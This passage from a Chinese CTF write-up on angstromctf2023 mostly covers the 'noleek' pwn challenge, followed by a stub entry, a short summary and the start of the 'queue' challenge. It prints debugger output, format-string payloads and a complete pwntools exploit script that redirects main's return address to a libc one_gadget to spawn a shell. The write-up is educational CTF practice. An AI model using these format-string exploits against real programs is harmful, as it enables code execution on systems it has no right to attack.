
- `call fprintf`后：

![image-20230716172207879](upload/attach/202402/830671_84RSNUS9PC2MEEN.jpg)

`0x7ffe48560ed8`对于`fprintf`函数来说，是格式化字符串参数后的第42个参数。

```shell
pwndbg> p (0x7ffe48560ed8-0x7ffe48560db0)/8+1+4
$2 = 42
```

现在第42个参数已经改成了`main_ret`的存放地址，那么接下来就是将其改成`gadget`的地址。

现在栈里找一个距离`libc`地址近的地址，第16个参数就可以：

```shell
0b:0058│ 0x7ffe48560e08 —▸ 0x7fa20b7e57cf (init_cacheinfo+287) ◂— mov rbp, rax
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
Start End Perm Size Offset File
0x560a5c98a000 0x560a5c98b000 r--p 1000 0 /chal/noleek
0x560a5c98b000 0x560a5c98c000 r-xp 1000 1000 /chal/noleek
0x560a5c98c000 0x560a5c98d000 r--p 1000 2000 /chal/noleek
0x560a5c98d000 0x560a5c98e000 r--p 1000 2000 /chal/noleek
0x560a5c98e000 0x560a5c98f000 rw-p 1000 3000 /chal/noleek
0x560a5e5ef000 0x560a5e610000 rw-p 21000 0 [heap]
0x7fa20b7c2000 0x7fa20b7e4000 r--p 22000 0 /lib/x86_64-linux-gnu/libc-2.31.so
0x7fa20b7e4000 0x7fa20b93d000 r-xp 159000 22000 /lib/x86_64-linux-gnu/libc-2.31.so
0x7fa20b93d000 0x7fa20b98c000 r--p 4f000 17b000 /lib/x86_64-linux-gnu/libc-2.31.so
0x7fa20b98c000 0x7fa20b990000 r--p 4000 1c9000 /lib/x86_64-linux-gnu/libc-2.31.so
0x7fa20b990000 0x7fa20b992000 rw-p 2000 1cd000 /lib/x86_64-linux-gnu/libc-2.31.so
0x7fa20b992000 0x7fa20b998000 rw-p 6000 0 [anon_7fa20b992]
0x7fa20b99e000 0x7fa20b99f000 r--p 1000 0 /lib/x86_64-linux-gnu/ld-2.31.so
0x7fa20b99f000 0x7fa20b9bf000 r-xp 20000 1000 /lib/x86_64-linux-gnu/ld-2.31.so
0x7fa20b9bf000 0x7fa20b9c7000 r--p 8000 21000 /lib/x86_64-linux-gnu/ld-2.31.so
0x7fa20b9c8000 0x7fa20b9c9000 r--p 1000 29000 /lib/x86_64-linux-gnu/ld-2.31.so
0x7fa20b9c9000 0x7fa20b9ca000 rw-p 1000 2a000 /lib/x86_64-linux-gnu/ld-2.31.so
0x7fa20b9ca000 0x7fa20b9cb000 rw-p 1000 0 [anon_7fa20b9ca]
0x7ffe48541000 0x7ffe48562000 rw-p 21000 0 [stack]
0x7ffe485bd000 0x7ffe485c1000 r--p 4000 0 [vvar]
0x7ffe485c1000 0x7ffe485c3000 r-xp 2000 0 [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]
```

再看看它和`one_gadget`之间的偏移是多少：`0xa4a91`

```shell
root@d3b03dc58069:/chal# one_gadget /lib/x86_64-linux-gnu/libc-2.31.so
0xc825a execve("/bin/sh", r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xc825d execve("/bin/sh", r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xc8260 execve("/bin/sh", rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
```

```shell
pwndbg> p/x (0x7fa20b7c2000+0xc8260)-0x7fa20b7e57cf
$4 = 0xa4a91
pwndbg> p 0xa4a91
$5 = 674449
```

> 这里选的是第三个`gadget`，因为`main`函数返回前将`rsi`和`rdx`清零了，满足第三个`gadget`的`constraints`：

> 
>
> ![image-20230716184528949](upload/attach/202402/830671_P58XTNC37ZMPVHN.jpg)

输入下面的格式化字符串，先打印第16个参数低4字节（`0x0b7e57cf`）个字符，然后打印`674449`个参数，最后它两之和（也就是`one_gadget`真实地址的低4字节）覆写第42个参数的低4字节，即将`main_ret`（`0x7fa20b7e5d0a`）修改为`one_gadget`的地址，最终拿到`shell`。

> 回顾一下格式化占位符（`format placeholder`）的语法：
>
> `%[parameter][flags][field width][.precision][length]type`
>
> - `Parameter`可以忽略或者是`n$`：`n`是用这个格式说明符（`specifier`）显示第几个参数

```shell
%*16$c%674449c%42$n
分开解读：
%*16$c 打印第16个参数低4Byte个字符（这个16$和后面的42$是一个概念）
%674449c 打印674449个字符
%42$n 将前面打印的字符数写入第42个参数
```

![image-20230716175930208](upload/attach/202402/830671_42ETPEYNWSFRVEA.jpg)

## 6.3 exp

```shell
%*c%56c%13$hn
%*16$c%674449c%42$n
```

不是每次都能成功，调试过程中我发现有时候输入以后，它会把第13个参数改成一个不知道是什么的数字。这时候我会重新输入`%*c%13$hn`，然后多试几次就ok。所以如果写成`python`脚本，也是用一个死循环来多试几次：

```python
from pwn import *
import warnings
import subprocess
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
context.log_level = 'DEBUG'
# context.log_level = 'CRITICAL'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./noleek")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
while True:
try:
p = process("./noleek")
# gdb.attach(p, """b *(main+140)""")
# payload = f'%*c%29$hn'
payload = f'%*c%{0x38}c%13$hn'.encode()
sla(b"leek? ", payload)
payload = f'%*16$c%{0xa4a91}c%42$n'.encode()
sla(b"more leek? ", payload)
ru(b'noleek.\n')
sl(b'cat flag.txt')
flag = rl()
print(flag)
except:
p.close()
continue
break
itr()
```

![image-20230716182631677](upload/attach/202402/830671_25UM82WN2S4C5V3.jpg)

# 7 Sailor's Revenge

> After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain!

智能合约，不会，正打算学这个。后面再补这题吧。

# 小结

- 这些题主要是栈溢出和格式化字符串漏洞
- 对于输入有长度限制的时候，注意`sendlineafter`和`sendafter`，不然容易卡在这个小细节里。
- 格式化字符串，网上稍微搜了搜，还是[维基百科](elink@8ffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6*7K9q4)9J5k6h3#2Q4x3X3g2%4K9h3E0A6M7r3g2V1K9h3q4Q4x3X3g2G2M7X3N6Q4x3V1k6%4K9h3E0A6i4K6u0r3i4K6t1#2c8e0k6Q4x3U0g2m8x3q4)9J5y4f1u0o6i4K6t1#2c8e0g2Q4x3U0g2n7b7#2)9J5y4e0S2r3i4K6t1#2c8e0g2Q4x3U0f1^5b7#2)9J5y4e0V1$3i4K6t1#2c8e0g2Q4x3U0g2m8c8q4)9J5y4e0V1%4i4K6t1#2c8e0N6Q4x3U0g2m8b7#2)9J5y4f1p5$3i4K6t1#2c8e0c8Q4x3U0g2n7z5q4)9J5y4f1t1J5)介绍得最详细。

# 参考文献

- <mark class="encrypted">e50K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2&6L8%4g2@1N6h3u0W2i4K6u0W2j5$3!0E0i4K6u0r3N6$3q4@1j5$3S2Q4x3@1k6$3i4K6y4p5K9Y4q4r3y4q4y4Y4K9e0c8m8M7Y4x3`.</mark>
- <mark class="encrypted">1daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6*7K9q4)9J5k6h3#2Q4x3X3g2%4K9h3E0A6M7r3g2V1K9h3q4Q4x3X3g2G2M7X3N6Q4x3V1k6%4K9h3E0A6i4K6u0r3i4K6t1#2c8e0k6Q4x3U0g2m8x3q4)9J5y4f1u0o6i4K6t1#2c8e0g2Q4x3U0g2n7b7#2)9J5y4e0S2r3i4K6t1#2c8e0g2Q4x3U0f1^5b7#2)9J5y4e0V1$3i4K6t1#2c8e0g2Q4x3U0g2m8c8q4)9J5y4e0V1%4i4K6t1#2c8e0N6Q4x3U0g2m8b7#2)9J5y4f1p5$3i4K6t1#2c8e0c8Q4x3U0g2n7z5q4)9J5y4f1t1J5</mark>
- <mark class="encrypted">e2dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1K9s2c8J5K9e0t1H3x3o6y4Y4L8h3q4A6L8q4)9J5c8V1y4f1c8W2N6J5K9i4c8W2N6i4m8Q4x3V1k6T1L8r3!0T1i4K6u0r3y4h3t1J5x3U0W2T1j5K6f1^5x3h3f1%4y4o6M7@1k6U0j5%4k6r3f1H3y4U0p5%4j5$3t1@1k6X3x3@1x3r3k6T1j5U0t1H3k6e0M7H3k6q4)9J5c8U0t1H3x3U0y4Q4x3V1k6S2L8X3N6K6N6s2u0G2L8f1y4f1c8W2)9J5c8X3&6G2L8r3g2W2K9#2)9J5c8W2u0q4b7f1c8y4c8g2)9J5k6h3#2V1</mark>

> 因为某原因，最近要看看ctf。
>
> [angstromctf2023](https://bbs.kanxue.com/elink@dcfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5J5x3o6t1K6i4K6u0W2j5h3&6Y4M7%4c8J5L8$3#2U0N6r3k6Q4x3X3g2U0L8$3#2Q4x3V1k6U0K9r3q4D9L8r3g2F1k6$3g2K6)早在4月就结束了。今天打开一看，诶，还能访问。那就下载下来做一做。
>
> 另外，搜到了一个[youtube视频](https://bbs.kanxue.com/elink@ddcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2&6L8%4g2@1N6h3u0W2i4K6u0W2j5$3!0E0i4K6u0r3N6$3q4@1j5$3S2Q4x3@1k6$3i4K6y4p5K9Y4q4r3y4q4y4Y4K9e0c8m8M7Y4x3`.)专门讲这个比赛的wp，下面的记录，以及pwn环境（docker）很多参考了这个视频。毕竟菜。

# 1 queue

> I just learned about stacks and queues in DSA!

## 1.1 运行

|  |  |
|---|---|
| 1  2  3  4  5 | `# 开启了canary`  `❯` `make` `checksec`  `docker run -it --rm -v "`pwd`:/chal" `ubuntu-demo checksec --file=queue`  `RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols     FORTIFY Fortified   Fortifiable FILE`  `Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   46) Symbols   No    0       2       queue` |
|  |  |
